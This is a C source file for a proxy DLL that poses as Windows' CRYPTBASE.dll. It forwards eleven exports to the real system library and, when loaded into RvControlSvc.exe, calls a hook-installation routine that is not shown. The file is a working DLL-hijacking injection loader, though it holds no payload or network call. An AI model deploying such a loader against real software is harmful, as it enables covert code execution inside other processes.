// inject3.c – Fake CRYPTBASE.dll that loads hooks and forwards to the real API
#include <windows.h>
#include <stddef.h>
#include "log.h"
// Global instance handle (set in DllMain)
static HINSTANCE g_hInstance = NULL;

// ============================================================
//  Function prototypes for the 11 exports (ordinal 1..11)
// ============================================================
#define DECL_EXPORT(nr) \
    __declspec(dllexport) void __stdcall SystemFunction##nr(void);

DECL_EXPORT(001)
DECL_EXPORT(002)
DECL_EXPORT(003)
DECL_EXPORT(004)
DECL_EXPORT(005)
DECL_EXPORT(028)
DECL_EXPORT(029)
DECL_EXPORT(034)
DECL_EXPORT(036)
DECL_EXPORT(040)
DECL_EXPORT(041)

// ============================================================
//  Real function pointers (filled at load time)
// ============================================================
typedef void (__stdcall *CryptBaseFunc)(void);

static CryptBaseFunc g_RealFuncs[11] = {0};
static HMODULE      g_hRealCrypt = NULL;

// ============================================================
//  Load the real CRYPTBASE.dll from System32 (always safe)
// ============================================================
static BOOL LoadRealCryptBase(void)
{
    wchar_t systemPath[MAX_PATH];
    UINT len = GetSystemDirectoryW(systemPath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) return FALSE;
    wcscat_s(systemPath, MAX_PATH, L"\\cryptbase.dll");

    g_hRealCrypt = LoadLibraryW(systemPath);
    if (!g_hRealCrypt) return FALSE;

    // Resolve all 11 functions by ordinal
    const char* names[] = {
        "SystemFunction001", "SystemFunction002", "SystemFunction003",
        "SystemFunction004", "SystemFunction005", "SystemFunction028",
        "SystemFunction029", "SystemFunction034", "SystemFunction036",
        "SystemFunction040", "SystemFunction041"
    };

    for (int i = 0; i < 11; i++) {
        g_RealFuncs[i] = (CryptBaseFunc)GetProcAddress(g_hRealCrypt, names[i]);
        if (!g_RealFuncs[i]) {
            FreeLibrary(g_hRealCrypt);
            g_hRealCrypt = NULL;
            return FALSE;
        }
    }
    return TRUE;
}

// ============================================================
//  Forwarding stubs – one per exported function
// ============================================================
#define DEF_FORWARD(nr, idx)                                        \
    void __stdcall SystemFunction##nr(void) {                       \
        if (g_RealFuncs[idx]) g_RealFuncs[idx]();                   \
    }

DEF_FORWARD(001, 0)
DEF_FORWARD(002, 1)
DEF_FORWARD(003, 2)
DEF_FORWARD(004, 3)
DEF_FORWARD(005, 4)
DEF_FORWARD(028, 5)
DEF_FORWARD(029, 6)
DEF_FORWARD(034, 7)
DEF_FORWARD(036, 8)
DEF_FORWARD(040, 9)
DEF_FORWARD(041, 10)

// ============================================================
//  Our hook injection (load the real hook DLL)
// ============================================================
static void InjectHooks(void)
{
    InitLog();

    // Get the full path of the current executable
    WCHAR exePath[MAX_PATH];
    DWORD len = GetModuleFileNameW(NULL, exePath, MAX_PATH);
    if (len == 0 || len >= MAX_PATH) {
        LogMsg("Failed to get module file name (error %lu), aborting", GetLastError());
        return;
    }

    // Extract the filename part (after last backslash)
    WCHAR *fileName = wcsrchr(exePath, L'\\');
    if (fileName)
        fileName++;   // skip the backslash
    else
        fileName = exePath;

    // Compare case‑insensitively with L"RvControlSvc.exe"
    if (_wcsicmp(fileName, L"RvControlSvc.exe") != 0) {
        LogMsg("Not RvControlSvc.exe (process: %ls) – injection skipped", fileName);
        return;
    }

    LogMsg("RvControlSvc.exe detected – installing hooks...");
    void run_injection(HMODULE hOriginal);
    run_injection(NULL);
}

// ============================================================
//  DLL Entry Point
// ============================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hInstance = hinstDLL;  // save for later use
        DisableThreadLibraryCalls(hinstDLL);

        if (!LoadRealCryptBase())
            return FALSE;   // abort – app won't work without it

        InjectHooks();
    }
    return TRUE;
}